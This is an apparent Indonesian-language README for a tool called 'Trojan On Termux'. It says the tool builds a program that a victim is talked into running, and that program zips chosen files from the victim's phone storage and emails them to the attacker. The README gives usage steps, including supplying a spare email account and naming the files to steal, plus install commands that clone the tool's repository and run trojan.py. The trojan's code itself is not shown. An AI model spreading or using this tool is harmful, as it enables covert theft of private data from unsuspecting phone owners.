# Trojan On Termux

'''
Tujuan :
Program Dibuat Untuk Mengambil Data Di penyimpanan internal korban
'''

'''
Cara Kerja :
Ketika Program yang dibuat tools ini dijalankan oleh korban
Data - Data yang anda inginkan akan dikirim ke Email anda 
berupa file zip
'''

'''
Peringatan :
Ukuran file yang besar akan beresiko , resikonya data - data korban
Tidak akan terkirim ke email anda karena terlalu besar size nya
'''
'''
Cara Pemakaian :
Masukan alamat email anda beserta passwordnya (saya sarankan pakai email cadangan saja)
lalu isi nama file untuk program tersebut selanjutnya isi nama data yang ingin anda ambil
di hp korban dan suruh korban menjalankan program tersebut
'''

#Cara Install Di termux
$pkg upgrade&&pkg update
$pkg install python
$pkg install python3
$pkg install zip
$pip install marshal
$pkg install git
$git clone https://github.com/Hagirs19/sv
cd sv 
python3 trojan.py

#Cara Install Di Kali - Linux
coming soon





